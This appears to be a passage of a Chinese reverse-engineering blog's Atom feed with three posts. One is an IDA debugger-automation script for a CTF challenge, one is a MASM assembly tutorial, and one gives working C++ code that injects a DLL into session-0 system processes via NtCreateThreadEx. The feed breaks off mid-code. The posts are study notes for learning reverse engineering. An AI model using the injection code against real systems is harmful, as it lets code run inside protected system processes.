<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>pRism</title>
  
  
  <link href="https://www.pri87.vip/atom.xml" rel="self"/>
  
  <link href="https://www.pri87.vip/"/>
  <updated>2025-03-04T15:29:16.079Z</updated>
  <id>https://www.pri87.vip/</id>
  
  <author>
    <name>pRism</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>IDA自动化调试</title>
    <link href="https://www.pri87.vip/posts/9be53c83.html"/>
    <id>https://www.pri87.vip/posts/9be53c83.html</id>
    <published>2025-03-04T14:52:26.000Z</published>
    <updated>2025-03-04T15:29:16.079Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>之前一直想找个方法实现IDA调试的时候自动执行操作，现在终于找到了</p><p>ida里面有一个api：ida_dbg.step_into()，效果是执行一次步入，通过循环这个指令就可以实现自动步入的效果，在步过后写自己需要的效果就好</p><h2 id="实现">实现</h2><p>下面是一个对于dasctf，BabyEnc的指令还原脚本，这个题将真的逻辑用汇编写了出来，并把每句汇编放在格式相同的花指令中，通过下面这个脚本可以提取每组汇编中的真实代码，组合成一个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> idc <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> ida_dbg</span><br><span class="line"></span><br><span class="line">statx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_address</span>(<span class="params">target_ea</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;trace_output.bin&quot;</span>, <span class="string">&quot;ab&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            ida_dbg.wait_for_next_event(ida_dbg.WFNE_SUSP, -<span class="number">1</span>)<span class="comment">#在获取内存/寄存器/状态和执行(f4,f7,f8,f9)之间必须有这行，ida是单线程，必须等待调试器获取到状态之后再取内容</span></span><br><span class="line">            current_ea = ida_dbg.get_reg_val(<span class="string">&quot;EIP&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> current_ea == target_ea:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;finished&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                handle_instruction(current_ea, f)</span><br><span class="line">                ida_dbg.step_into()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_instruction</span>(<span class="params">ea, file</span>):</span><br><span class="line">    <span class="keyword">global</span> statx</span><br><span class="line">    statx-=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(statx &lt;= <span class="number">0</span>):<span class="comment">#减少时间，ida指令需要时间</span></span><br><span class="line">        instr = idc.GetDisasm(ea)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;jmp     ebx&quot;</span> <span class="keyword">in</span> instr:<span class="comment">#在每块的结尾执行</span></span><br><span class="line">            statx = <span class="number">11</span></span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            ea_temp = ea</span><br><span class="line">            prev_instr = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">while</span> count &lt; <span class="number">11</span>:<span class="comment">#向上找第十一行代码</span></span><br><span class="line">                ea_temp = idc.prev_head(ea_temp)</span><br><span class="line">                prev_instr = idc.GetDisasm(ea_temp)</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;popa&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> prev_instr <span class="keyword">and</span> <span class="string">&quot;cmp&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> prev_instr:<span class="comment">#过滤跳转指令</span></span><br><span class="line">                machine_code = ida_bytes.get_bytes(ea_temp, idc.get_item_size(ea_temp))</span><br><span class="line">                file.write(machine_code)</span><br><span class="line">                <span class="built_in">print</span>(prev_instr)</span><br><span class="line"></span><br><span class="line">check_address(<span class="number">0x0041F082</span>)</span><br></pre></td></tr></table></figure><p>另一种实现是依赖断点的实现，继承DBG_hooks实现断点钩子，需要准确知道在哪里下断点才行，感觉有点麻烦，不过要是能算出来具体的位置，那也很简单，速度也更快</p><h2 id="缺点">缺点</h2><p>需要的时间太长了，尤其是在有长花指令的情况下，这段代码大概执行了90分钟左右，但是没有花指令一般好像也不需要这种操作(也许控制流混淆需要？)。不过另外一方面，编写这种脚本不需要脑子，不需要主动获取寄存器的值，模拟执行可能写的有偏差，但是这种就肯定不会错。</p>]]></content>
    
    
    <summary type="html">IDA的自动化调试</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>MASM汇编</title>
    <link href="https://www.pri87.vip/posts/dfd755e7.html"/>
    <id>https://www.pri87.vip/posts/dfd755e7.html</id>
    <published>2025-02-28T10:42:42.000Z</published>
    <updated>2025-03-02T09:10:58.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="x16基本格式">x16基本格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">code segment;指定段</span><br><span class="line"></span><br><span class="line">int 21h;退出</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="x86基本格式">x86基本格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">.586;指定指令集版本</span><br><span class="line">.model flat,stdcall;设置内存模型和调用约定:_edecl,_stdcall,_fastcall，_thiscall</span><br><span class="line">option casemap:none;区分大小写</span><br><span class="line"></span><br><span class="line">includelib ucrt.lib;导入c相关标准库</span><br><span class="line">includelib legacy_stdio_definitions.lib;导入c相关库</span><br><span class="line"></span><br><span class="line">includelib Kernel32.lib</span><br><span class="line">includelib User32.lib</span><br><span class="line"></span><br><span class="line">MessageBoxA proto hwnd:DWORD,lpText:BYTE,lpCaption:BYTE,uType:DWORD</span><br><span class="line">ExitProcess proto uCode:DWORD</span><br><span class="line"></span><br><span class="line">extern printf:proc;声明外部函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data;指定段</span><br><span class="line">szFormat db &#x27;%d&#x27;, 0</span><br><span class="line"></span><br><span class="line">.code;指定段</span><br><span class="line">main proc</span><br><span class="line">mov eax,64h</span><br><span class="line">push eax;函数调用</span><br><span class="line">lea ecx,szFormat</span><br><span class="line">push ecx</span><br><span class="line">call printf</span><br><span class="line">add esp,8;c标准</span><br><span class="line"></span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">call MessageBoxA;</span><br><span class="line">push 0</span><br><span class="line">call ExitProcess;win标准 或者可以写invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="汇编头文件-inc">汇编头文件(.inc)</h3><p>包含头文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include header.inc</span><br></pre></td></tr></table></figure><h3 id="伪指令">伪指令</h3><h4 id="invoke">invoke</h4><p>使用前必须先定义，比如上面的<code>ExitProcess proto uCode:DWORD</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke farproc,para1,para2,...</span><br></pre></td></tr></table></figure><p>只能用于win32 api</p><p><a href="https://masm32.com/download.htm">Download The MASM32 SDK</a>下载MASM32SDK</p><p>效果是可以直接导入已经定义好的函数，可以直接invoke</p><p>在项目属性中Microsoft Macro Assembler-include Paths中附加MASM中的include目录，然后可以直接这样使用函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">.586;指定指令集版本</span><br><span class="line">.model flat,stdcall;设置内存模型和调用约定:_edecl,_stdcall,_fastcall，_thiscall</span><br><span class="line">option casemap:none;区分大小写</span><br><span class="line"></span><br><span class="line">includelib ucrt.lib;导入c相关标准库</span><br><span class="line">includelib legacy_stdio_definitions.lib;导入c相关库</span><br><span class="line"></span><br><span class="line">include Kernel32.inc</span><br><span class="line">include User32.inc</span><br><span class="line"></span><br><span class="line">includelib Kernel32.lib</span><br><span class="line">includelib User32.lib</span><br><span class="line"></span><br><span class="line">extern printf:proc;声明外部函数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data;指定段</span><br><span class="line">szFormat db &#x27;%d&#x27;, 0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">mov eax,64h</span><br><span class="line">push eax;函数调用</span><br><span class="line">lea ecx,szFormat</span><br><span class="line">push ecx</span><br><span class="line">call printf</span><br><span class="line">add esp,8;c标准</span><br><span class="line"></span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">push 0</span><br><span class="line">call MessageBoxA;</span><br><span class="line">push 0</span><br><span class="line">call ExitProcess;win标准 或者可以写invoke ExitProcess,0</span><br><span class="line">main endp</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>对于自己定义的函数，使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">addx proc numA:dword,numB:dword</span><br><span class="line">xor eax,eax</span><br><span class="line">add eax,numA</span><br><span class="line">add eax,numB</span><br><span class="line">ret</span><br><span class="line">addx endp</span><br></pre></td></tr></table></figure><p>这样的格式，也可以用invoke调用，对于C库的cstd函数，可以通过这个方式进行一次std的封装。</p><h4 id="if">if</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">main proc</span><br><span class="line">mov dwIndex,11</span><br><span class="line">    .if dwIndex== 10</span><br><span class="line">    mov dwNumber,10</span><br><span class="line">    invoke printNumber,dwNumber</span><br><span class="line">    .elseif deIndex &gt;= 12</span><br><span class="line">    mov dwNumber,12</span><br><span class="line">    invoke printNumber,dwNumber</span><br><span class="line">    .else</span><br><span class="line">    mov dwNumber,0</span><br><span class="line">    invoke printNumber,dwNumber</span><br><span class="line">    .endif</span><br><span class="line">main endp</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">.break;跳出循环</span><br><span class="line">.continue;跳到条件检查</span><br></pre></td></tr></table></figure><h4 id="while">while</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov dwIndex,100</span><br><span class="line">.while dwIndex&gt;0</span><br><span class="line">dec deIndex</span><br><span class="line">.endw</span><br></pre></td></tr></table></figure><h3 id="宏">宏</h3><p>无参宏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAA EQU 100</span><br></pre></td></tr></table></figure><p>将AAA当100</p><p>有参宏</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">;定义</span><br><span class="line">MyAdd MACRO n1</span><br><span class="line">add eax,n1</span><br><span class="line">endm</span><br><span class="line">;使用</span><br><span class="line">MyAdd &lt;1&gt;;简单参数也可以直接MyAdd 1</span><br><span class="line"></span><br><span class="line">MyAdd2 MACRO reg,n1</span><br><span class="line">add reg,n1</span><br><span class="line">endm</span><br><span class="line"></span><br><span class="line">MyAdd eax,10</span><br></pre></td></tr></table></figure><h3 id="结构体">结构体</h3><p>在data段外声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Point struct;声明</span><br><span class="line">x word ?</span><br><span class="line">y word ?</span><br><span class="line">Point ends</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">MyPoint Point&lt;?&gt;;不初始化定义</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">    mov MyPoint.x,123</span><br><span class="line">    mov MyPoint.y,456</span><br><span class="line">main endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h3 id="内联汇编">内联汇编</h3><p>vs中可以在c和cpp中使用内联汇编</p><p>x86：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_asm&#123;</span><br><span class="line">push MB_OK;可以直接传宏</span><br><span class="line">call myFunc;可以直接调用定义的函数</span><br><span class="line">_emit 1;立即数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>x64：</p><p>在生成依赖项中勾选masm，新建asm文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">Myadd proc</span><br><span class="line">mov ecx,edx</span><br><span class="line">mov eax,ecx</span><br><span class="line">ret</span><br><span class="line">Myadd endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>再声明head.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exten <span class="string">&quot;C&quot;</span> DWORD <span class="title function_">Myadd</span><span class="params">(DWORD a,DWORD b)</span>;</span><br></pre></td></tr></table></figure><p>包含这个文件即可直接使用</p><h2 id="x64基本格式">x64基本格式</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">sub rsp,28h</span><br><span class="line">add rsp,28h</span><br><span class="line">ret</span><br><span class="line">main endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>可以直接写代码，调用函数用fastcall</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">.data?;定义未初始化数据</span><br><span class="line">.const;定义常量</span><br></pre></td></tr></table></figure><p>通过修改编译器为inter，可以继续使用内联汇编</p><p>可以直接使用vs或者ida查看c/cpp代码然后取得相应的汇编代码，避免麻烦<br>VS中需要先取消符号</p>]]></content>
    
    
    <summary type="html">MASM下的汇编学习</summary>
    
    
    
    
    <category term="汇编" scheme="https://www.pri87.vip/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>《逆核》0C-向会话0注入DLL</title>
    <link href="https://www.pri87.vip/posts/9dacfd2d.html"/>
    <id>https://www.pri87.vip/posts/9dacfd2d.html</id>
    <published>2025-02-27T07:30:04.000Z</published>
    <updated>2025-02-27T10:19:14.278Z</updated>
    
    <content type="html"><![CDATA[<h2 id="会话">会话</h2><p>会话是登录后的用户环境</p><p>在进程管理器中详细信息的空栏中右键，可以打开会话属性：</p><p><img src="https://s2.loli.net/2025/02/27/NUsmc2Vodyr4CLP.png" alt="image-20250227180553270"></p><p>它用来隔离不同用户的操作环境，会话ID的先后顺序取决于系统启动后哪个用户先登录，会话0一般为系统进程，和用户进程隔离来提高安全性。（但是看起来似乎没什么用）</p><p>如果要注入系统进程，直接使用CreateRemoteThread会被拦截下来，所以需要用另外的办法。最简单的就是换一个API：NtCreateThreadEx</p><p>定义如下，与CreateRemoteThread差不多</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* PFNTCREATETHREADEX)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,<span class="comment">//创建的线程的线程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,<span class="comment">//线程权限</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,<span class="comment">//属性，一般nullptr</span></span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,<span class="comment">//目标进程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,<span class="comment">//起始函数</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,<span class="comment">//参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">ULONG CreateThreadFlags,<span class="comment">//好像和挂起有关，填FALSE即可</span></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T ZeroBits,<span class="comment">//0即可</span></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T StackSize,<span class="comment">//0即可</span></span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T MaximumStackSize,<span class="comment">//0即可</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown<span class="comment">//nullptr即可</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>直接用这个注入就好</p><p>注入器代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">modifiedCreateRemoteThread</span><span class="params">(HANDLE hProcess, LPTHREAD_START_ROUTINE pThreadProc, LPVOID pRemoteBuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FARPROC pNtCreateThreadEx = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtCreateThreadEx&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!pNtCreateThreadEx)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NtCreateThreadEx not found&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* PFNTCREATETHREADEX)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID pUnkown</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line">PFNTCREATETHREADEX crt = <span class="built_in">reinterpret_cast</span>&lt;PFNTCREATETHREADEX&gt;(pNtCreateThreadEx);</span><br><span class="line">HANDLE hThread;</span><br><span class="line"><span class="built_in">crt</span>(&amp;hThread, THREAD_ALL_ACCESS, <span class="literal">nullptr</span>, hProcess, pThreadProc, pRemoteBuf, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">nullptr</span>);</span><br><span class="line"><span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create thread failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);<span class="comment">//等待线程结束</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line"><span class="type">bool</span> status = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))<span class="comment">//取得对应PID句柄</span></span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;open %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<span class="comment">//申请内存</span></span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="number">0</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;memory alloc failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);<span class="comment">//写入地址</span></span><br><span class="line">HMODULE kernel = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (kernel == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(kernel, <span class="string">&quot;LoadLibraryW&quot;</span>);<span class="comment">//获取LodaLibrary地址</span></span><br><span class="line">status = <span class="built_in">modifiedCreateRemoteThread</span>(hProcess,</span><br><span class="line">pThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">pBuf<span class="comment">//传参</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[]) &#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;USAGE: %s pid dll_path\n&quot;</span>), argv[<span 